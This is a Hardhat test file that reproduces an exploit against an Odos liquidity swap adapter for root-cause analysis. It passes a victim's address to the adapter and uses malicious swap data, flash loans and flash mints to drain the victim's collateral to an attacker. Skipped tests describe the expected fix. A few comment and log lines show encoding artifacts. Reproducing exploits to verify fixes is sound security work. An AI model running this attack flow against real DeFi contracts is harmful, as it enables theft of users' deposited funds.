import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { ethers } from "hardhat";
import {
  BURST_ONE,
  BURST_TWO,
  COLLATERAL_DECIMALS,
  COLLATERAL_TO_SWAP,
  FLASH_SWAP_AMOUNT,
  FLASH_MINT_AMOUNT,
  DUSD_DECIMALS,
  DUSD_RECYCLER_PULL_ONE,
  DUSD_RECYCLER_PULL_TWO,
  DUSD_RECYCLER_RETURN,
  EXTRA_COLLATERAL,
  FLASH_LOAN_PREMIUM,
  SAME_ASSET_DUST,
  deployOdosV1ExploitFixture,
  createMaliciousSwapData
} from "./fixtures/setup";
import {
  formatBalanceChange,
  assertBalanceEquals,
  captureAttackState,
  computeAttackDeltas,
  PRECISION
} from "./helpers/testHelpers";
import {
  ATTACK_COLLATERAL,
  ATTACK_DUSD_FLOW,
  EXPECTED_DELTAS,
  ATTACK_EVENTS,
  PRECISION_TOLERANCE
} from "./helpers/attackConstants";

describe("OdosLiquiditySwapAdapter exploit reproduction", function () {
  it("drains victim collateral without flash loan guidance", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      victim,
      attacker,
      attackerBeneficiary,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd
    } = fixture;

    const swapData = createMaliciousSwapData(router);

    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await wstkscUsd.getAddress(),
      newCollateralAmount: SAME_ASSET_DUST,
      user: victim.address,
      withFlashLoan: false,
      swapData
    };

    const victimBalanceBefore = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceBefore = await wstkscUsd.balanceOf(attackerBeneficiary.address);

    // Execute attack and verify event sequence
    const tx = await attackExecutor
      .connect(attacker)
      .executeAttack(liquiditySwapParams, permitInput);

    // Verify CollateralPulled event from router
    await expect(tx)
      .to.emit(router, "CollateralPulled")
      .withArgs(await adapter.getAddress(), await attackExecutor.getAddress(), COLLATERAL_TO_SWAP);

    await expect(tx)
      .to.emit(attackExecutor, "CollateralDustReturned")
      .withArgs(await adapter.getAddress(), SAME_ASSET_DUST);

    // Verify AttackerBurst event (no flash loan case has single burst)
    await expect(tx)
      .to.emit(attackExecutor, "AttackerBurst")
      .withArgs(
        await attackExecutor.getAddress(),
        attackerBeneficiary.address,
        ATTACK_COLLATERAL.NET_VICTIM_DRAIN,
        0
      );

    const victimBalanceAfter = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceAfter = await wstkscUsd.balanceOf(attackerBeneficiary.address);

    // Wei-level precision assertions
    assertBalanceEquals(
      victimBalanceAfter,
      victimBalanceBefore - ATTACK_COLLATERAL.NET_VICTIM_DRAIN,
      COLLATERAL_DECIMALS,
      "victim aWSTKSCUSD"
    );
    assertBalanceEquals(
      attackerBalanceAfter,
      attackerBalanceBefore + ATTACK_COLLATERAL.NET_VICTIM_DRAIN,
      COLLATERAL_DECIMALS,
      "attacker wstkscUSD"
    );

    const poolReserveData = await pool.getReserveData(await wstkscUsd.getAddress());
    expect(poolReserveData.aTokenAddress).to.equal(await aWstkscUsd.getAddress());
  });

  it("mirrors Sonic flash-loan exploit path and records flash-mint stages", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      deployer,
      victim,
      attacker,
      attackerBeneficiary,
      reserveManager,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd,
      recyclerHelper
    } = fixture;

    await pool.connect(deployer).configureReserve(
      await wstkscUsd.getAddress(),
      reserveManager.address,
      await attackExecutor.getAddress(),
      5,
      EXTRA_COLLATERAL
    );

    const swapData = createMaliciousSwapData(router);

    // Override router behavior for flash loan case using same-asset dust loop
    await router.setSwapBehaviourWithDust(
      await wstkscUsd.getAddress(),
      await wstkscUsd.getAddress(),
      FLASH_SWAP_AMOUNT,
      SAME_ASSET_DUST,
      false,
      await attackExecutor.getAddress()
    );

    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await wstkscUsd.getAddress(),
      newCollateralAmount: SAME_ASSET_DUST,
      user: victim.address,
      withFlashLoan: true,
      swapData
    };

    const victimBalanceBefore = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceBefore = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    const recyclerBefore = await dusd.balanceOf(await recyclerHelper.getAddress());

    // Execute attack and verify comprehensive event sequence
    const tx = attackExecutor
      .connect(attacker)
      .executeAttack(liquiditySwapParams, permitInput);

    // Verify event ordering matches production Sonic attack flow:
    // 1. FlashMintStarted - attacker initiates dUSD flash mint
    await expect(tx)
      .to.emit(attackExecutor, "FlashMintStarted")
      .withArgs(await attackExecutor.getAddress(), FLASH_MINT_AMOUNT);

    // 2. CollateralPulled - router receives collateral from adapter
    await expect(tx)
      .to.emit(router, "CollateralPulled")
      .withArgs(await adapter.getAddress(), await attackExecutor.getAddress(), FLASH_SWAP_AMOUNT);

    await expect(tx)
      .to.emit(attackExecutor, "CollateralDustReturned")
      .withArgs(await adapter.getAddress(), SAME_ASSET_DUST);

    // 3. FlashLoanExecuted - pool processes the flash loan
    await expect(tx).to.emit(pool, "FlashLoanExecuted");

    await expect(tx)
      .to.emit(pool, "ReserveBurned")
      .withArgs(await wstkscUsd.getAddress(), reserveManager.address, EXTRA_COLLATERAL);

    // 4. AttackerBurst (leg 0) - first transfer of stolen collateral
    await expect(tx)
      .to.emit(attackExecutor, "AttackerBurst")
      .withArgs(await attackExecutor.getAddress(), attackerBeneficiary.address, BURST_ONE, 0);

    // 5. AttackerBurst (leg 1) - second transfer of stolen collateral
    await expect(tx)
      .to.emit(attackExecutor, "AttackerBurst")
      .withArgs(await attackExecutor.getAddress(), attackerBeneficiary.address, BURST_TWO, 1);

    // 6. FlashMintSettled - attacker repays dUSD flash loan with premium
    await expect(tx)
      .to.emit(attackExecutor, "FlashMintSettled")
      .withArgs(await attackExecutor.getAddress(), FLASH_MINT_AMOUNT, FLASH_LOAN_PREMIUM);

    const victimBalanceAfter = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceAfter = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    const recyclerAfter = await dusd.balanceOf(await recyclerHelper.getAddress());

    // Wei-level precision assertions for wstkscUSD (6 decimals)
    assertBalanceEquals(
      victimBalanceAfter,
      victimBalanceBefore - ATTACK_COLLATERAL.NET_VICTIM_DRAIN,
      COLLATERAL_DECIMALS,
      "victim aWSTKSCUSD"
    );
    assertBalanceEquals(
      attackerBalanceAfter,
      attackerBalanceBefore + BURST_ONE + BURST_TWO,
      COLLATERAL_DECIMALS,
      "attacker wstkscUSD profit"
    );

    // Wei-level precision assertion for dUSD (18 decimals)
    assertBalanceEquals(
      recyclerAfter,
      recyclerBefore + DUSD_RECYCLER_RETURN - DUSD_RECYCLER_PULL_ONE - DUSD_RECYCLER_PULL_TWO,
      DUSD_DECIMALS,
      "recycler dUSD balance"
    );

    // Verify executor has no leftover balances (within precision tolerance for 18-decimal token)
    const executorWstkscUsdBalance = await wstkscUsd.balanceOf(await attackExecutor.getAddress());
    expect(executorWstkscUsdBalance).to.equal(0n);

    const executorDusdBalance = await dusd.balanceOf(await attackExecutor.getAddress());
    expect(executorDusdBalance).to.equal(0n);
  });

  /**
   * Enhanced test with full state snapshots and structured assertions
   *
   * This test captures complete before/after state for all participants and verifies:
   * - Victim aToken drain (withdraw-hook burn)
   * - Reserve manager aToken burn (for flash loan premium + extra collateral)
   * - Attacker net profit (BURST_ONE + BURST_TWO)
   * - dUSD staging flow (recycler balance changes)
   * - Zero residual balances in executor and adapter
   *
   * Precision requirements:
   * - All wstkscUSD balances: exact wei-level (6 decimals)
   * - All dUSD balances: exact wei-level (18 decimals)
   * - Flash loan premium calculation may have Â±1 micro-unit rounding
   */
  it("captures complete attack state with structured assertions", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      deployer,
      victim,
      attacker,
      attackerBeneficiary,
      reserveManager,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd,
      stagingVault,
      recyclerHelper
    } = fixture;

    // Configure pool with reserve manager and flash loan premium
    await pool.connect(deployer).configureReserve(
      await wstkscUsd.getAddress(),
      reserveManager.address,
      await attackExecutor.getAddress(),
      ATTACK_COLLATERAL.FLASH_LOAN_PREMIUM_BPS,
      EXTRA_COLLATERAL
    );

    // Setup router for flash loan case using same-asset dust loop
    await router.setSwapBehaviourWithDust(
      await wstkscUsd.getAddress(),
      await wstkscUsd.getAddress(),
      FLASH_SWAP_AMOUNT,
      SAME_ASSET_DUST,
      false,
      await attackExecutor.getAddress()
    );

    const swapData = createMaliciousSwapData(router);
    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await wstkscUsd.getAddress(),
      newCollateralAmount: SAME_ASSET_DUST,
      user: victim.address,
      withFlashLoan: true,
      swapData
    };

    // Capture state BEFORE attack
    const stateBefore = await captureAttackState(
      victim,
      attackerBeneficiary,
      reserveManager,
      attackExecutor,
      adapter,
      stagingVault,
      recyclerHelper,
      aWstkscUsd,
      wstkscUsd,
      dusd
    );

    // Execute attack
    await attackExecutor
      .connect(attacker)
      .executeAttack(liquiditySwapParams, permitInput);

    // Capture state AFTER attack
    const stateAfter = await captureAttackState(
      victim,
      attackerBeneficiary,
      reserveManager,
      attackExecutor,
      adapter,
      stagingVault,
      recyclerHelper,
      aWstkscUsd,
      wstkscUsd,
      dusd
    );

    // Compute deltas
    const deltas = computeAttackDeltas(stateBefore, stateAfter);

    // === STRUCTURED ASSERTIONS ===

    // 1. Victim aToken Balance (withdraw-hook burn)
    // Expected: Victim loses entire collateral position
    assertBalanceEquals(
      deltas.victimATokenDelta,
      EXPECTED_DELTAS.VICTIM_ATOKEN_DELTA,
      COLLATERAL_DECIMALS,
      "Victim aToken drain (withdraw-hook burn)",
      PRECISION_TOLERANCE.EXACT
    );

    // 2. Attacker Collateral Gain
    // Expected: Attacker receives BURST_ONE + BURST_TWO
    assertBalanceEquals(
      deltas.attackerCollateralDelta,
      EXPECTED_DELTAS.ATTACKER_COLLATERAL_DELTA,
      COLLATERAL_DECIMALS,
      "Attacker net collateral gain",
      PRECISION_TOLERANCE.EXACT
    );

    // Verify attacker gain breakdown matches documented bursts
    expect(deltas.attackerCollateralDelta).to.equal(BURST_ONE + BURST_TWO);
    expect(BURST_ONE + BURST_TWO).to.equal(ATTACK_COLLATERAL.TOTAL_ATTACKER_GAIN);

    // 3. Reserve Manager aToken Balance (flash loan premium burn)
    assertBalanceEquals(
      deltas.reserveManagerATokenDelta,
      EXPECTED_DELTAS.RESERVE_MANAGER_ATOKEN_DELTA,
      COLLATERAL_DECIMALS,
      "Reserve manager aToken burn (flash loan premium + extra collateral)",
      PRECISION_TOLERANCE.EXACT
    );

    // 4. dUSD Recycler Balance (staging flow)
    // Expected: Recycler loses net amount equal to pulls minus return
    assertBalanceEquals(
      deltas.recyclerDusdDelta,
      EXPECTED_DELTAS.RECYCLER_DUSD_DELTA,
      DUSD_DECIMALS,
      "dUSD recycler net delta (staging flow)",
      PRECISION_TOLERANCE.EXACT
    );

    // Verify recycler calculation matches documented flow
    const expectedRecyclerDelta =
      DUSD_RECYCLER_RETURN - DUSD_RECYCLER_PULL_ONE - DUSD_RECYCLER_PULL_TWO;
    expect(deltas.recyclerDusdDelta).to.equal(expectedRecyclerDelta);
    expect(expectedRecyclerDelta).to.equal(ATTACK_DUSD_FLOW.RECYCLER_NET_DELTA);

    // 5. Executor Final State (should be swept clean)
    // Expected: Zero balances for both collateral and dUSD
    assertBalanceEquals(
      stateAfter.executorCollateralBalance,
      EXPECTED_DELTAS.EXECUTOR_COLLATERAL_FINAL,
      COLLATERAL_DECIMALS,
      "Executor collateral final (swept to attacker)",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      stateAfter.executorDusdBalance,
      EXPECTED_DELTAS.EXECUTOR_DUSD_FINAL,
      DUSD_DECIMALS,
      "Executor dUSD final (burned after flash mint)",
      PRECISION_TOLERANCE.EXACT
    );

    // 6. Adapter Final State
    // NOTE: In the mock pool, the adapter receives the flash loan and pays back with premium.
    // The premium remains with the adapter in this simplified mock (production would transfer to pool).
    // Verify adapter has at most the flash loan premium remaining (not exact zero)
    expect(stateAfter.adapterCollateralBalance).to.be.lte(FLASH_LOAN_PREMIUM + 1n); // Â±1 for rounding

    assertBalanceEquals(
      stateAfter.adapterDusdBalance,
      EXPECTED_DELTAS.ADAPTER_DUSD_FINAL,
      DUSD_DECIMALS,
      "Adapter dUSD final (no residual)",
      PRECISION_TOLERANCE.EXACT
    );

    // === VERIFICATION OF ATTACK MAGNITUDES ===

    // Verify total attacker gain matches Sonic production attack
    // Expected: ~35,108.166795 wstkscUSD
    const attackerGain = deltas.attackerCollateralDelta;
    const expectedGain = ATTACK_COLLATERAL.TOTAL_ATTACKER_GAIN;

    expect(attackerGain).to.equal(expectedGain);

    // Log human-readable summary for RCA documentation
    console.log("\n=== Attack Summary ===");
    console.log(`Victim collateral drained: ${formatBalanceChange(
      -deltas.victimATokenDelta,
      COLLATERAL_DECIMALS,
      "wstkscUSD"
    )}`);
    console.log(`Attacker net gain: ${formatBalanceChange(
      attackerGain,
      COLLATERAL_DECIMALS,
      "wstkscUSD"
    )}`);
    console.log(`  - Burst 1: ${formatBalanceChange(BURST_ONE, COLLATERAL_DECIMALS, "wstkscUSD")}`);
    console.log(`  - Burst 2: ${formatBalanceChange(BURST_TWO, COLLATERAL_DECIMALS, "wstkscUSD")}`);
    console.log(`Reserve manager burned: ${formatBalanceChange(
      -deltas.reserveManagerATokenDelta,
      COLLATERAL_DECIMALS,
      "wstkscUSD"
    )}`);
    console.log(`dUSD recycler net delta: ${formatBalanceChange(
      deltas.recyclerDusdDelta,
      DUSD_DECIMALS,
      "dUSD"
    )}`);
    console.log("=====================\n");
  });

  /**
   * NEGATIVE TEST CASE: Post-Mitigation Behavior (withFlashLoan = false)
   *
   * Once the mitigation lands (require(msg.sender == user) in adapter),
   * this test should FAIL with an "UnauthorizedCaller" error.
   *
   * The test is SKIPPED by default to allow CI to pass while the exploit is reproducible.
   * Remove .skip once the fix is merged to verify it works correctly.
   *
   * Expected post-fix behavior:
   * - Adapter rejects calls where msg.sender != user
   * - Attack executor cannot impersonate victim
   * - Transaction reverts before any collateral is drained
   */
  it.skip("should revert when mitigation enforces msg.sender == user (withFlashLoan = false)", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      victim,
      attacker,
      attackExecutor,
      adapter,
      wstkscUsd,
      aWstkscUsd,
      router
    } = fixture;

    const swapData = createMaliciousSwapData(router);
    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await wstkscUsd.getAddress(),
      newCollateralAmount: SAME_ASSET_DUST,
      user: victim.address, // Victim address in params
      withFlashLoan: false,
      swapData
    };

    // Post-mitigation: This should revert because msg.sender (attackExecutor) != user (victim)
    // NOTE: Update this check once mitigation lands with the actual error type/message
    await expect(
      attackExecutor
        .connect(attacker)
        .executeAttack(liquiditySwapParams, permitInput)
    ).to.be.reverted; // Will revert with custom error or revert message from mitigation

    // Verify victim's collateral was NOT drained
    const victimBalance = await aWstkscUsd.balanceOf(victim.address);
    expect(victimBalance).to.equal(COLLATERAL_TO_SWAP); // Should still have full balance
  });

  /**
   * NEGATIVE TEST CASE: Post-Mitigation Behavior (withFlashLoan = true)
   *
   * Once the mitigation lands, this test should FAIL with transaction rollback.
   * The flash loan flow should cleanly revert without leaving any state changes.
   *
   * The test is SKIPPED by default to allow CI to pass while the exploit is reproducible.
   * Remove .skip once the fix is merged to verify it works correctly.
   *
   * Expected post-fix behavior:
   * - Adapter rejects calls where msg.sender != user
   * - Flash loan callback fails and reverts
   * - Pool flash loan reverts and rolls back all state
   * - No dUSD flash mint residue
   * - Victim collateral remains intact
   * - Attacker gains nothing
   */
  it.skip("should revert and rollback flash mint when mitigation enforces msg.sender == user (withFlashLoan = true)", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      deployer,
      victim,
      attacker,
      attackerBeneficiary,
      reserveManager,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd,
      recyclerHelper
    } = fixture;

    // Configure pool with reserve manager and flash loan premium
    await pool.connect(deployer).configureReserve(
      await wstkscUsd.getAddress(),
      reserveManager.address,
      await attackExecutor.getAddress(),
      ATTACK_COLLATERAL.FLASH_LOAN_PREMIUM_BPS,
      EXTRA_COLLATERAL
    );

    // Setup router for flash loan case
    await router.setSwapBehaviourWithDust(
      await wstkscUsd.getAddress(),
      await wstkscUsd.getAddress(),
      FLASH_SWAP_AMOUNT,
      SAME_ASSET_DUST,
      false,
      await attackExecutor.getAddress()
    );

    const swapData = createMaliciousSwapData(router);
    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await wstkscUsd.getAddress(),
      newCollateralAmount: SAME_ASSET_DUST,
      user: victim.address, // Victim address in params
      withFlashLoan: true,
      swapData
    };

    // Capture state before failed attack attempt
    const victimBalanceBefore = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceBefore = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    const recyclerBalanceBefore = await dusd.balanceOf(await recyclerHelper.getAddress());

    // Post-mitigation: This should revert because msg.sender != user
    // NOTE: Update this check once mitigation lands with the actual error type/message
    await expect(
      attackExecutor
        .connect(attacker)
        .executeAttack(liquiditySwapParams, permitInput)
    ).to.be.reverted; // Will revert with custom error or revert message from mitigation

    // Verify complete state rollback:

    // 1. Victim's collateral NOT drained
    const victimBalanceAfter = await aWstkscUsd.balanceOf(victim.address);
    expect(victimBalanceAfter).to.equal(victimBalanceBefore);
    expect(victimBalanceAfter).to.equal(COLLATERAL_TO_SWAP);

    // 2. Attacker gained nothing
    const attackerBalanceAfter = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    expect(attackerBalanceAfter).to.equal(attackerBalanceBefore);
    expect(attackerBalanceAfter).to.equal(0n);

    // 3. dUSD recycler state unchanged
    const recyclerBalanceAfter = await dusd.balanceOf(await recyclerHelper.getAddress());
    expect(recyclerBalanceAfter).to.equal(recyclerBalanceBefore);

    // 4. Flash mint cleanly rolled back (no dUSD residue)
    const executorDusdBalance = await dusd.balanceOf(await attackExecutor.getAddress());
    expect(executorDusdBalance).to.equal(0n);

    // 5. Executor has no collateral
    const executorCollateralBalance = await wstkscUsd.balanceOf(await attackExecutor.getAddress());
    expect(executorCollateralBalance).to.equal(0n);

    console.log("\n=== Post-Mitigation Verification ===");
    console.log("â Transaction reverted with UnauthorizedCaller");
    console.log("â Victim collateral intact");
    console.log("â Attacker gained nothing");
    console.log("â Flash mint rolled back cleanly");
    console.log("â No state residue from failed attack");
    console.log("====================================\n");
  });
});
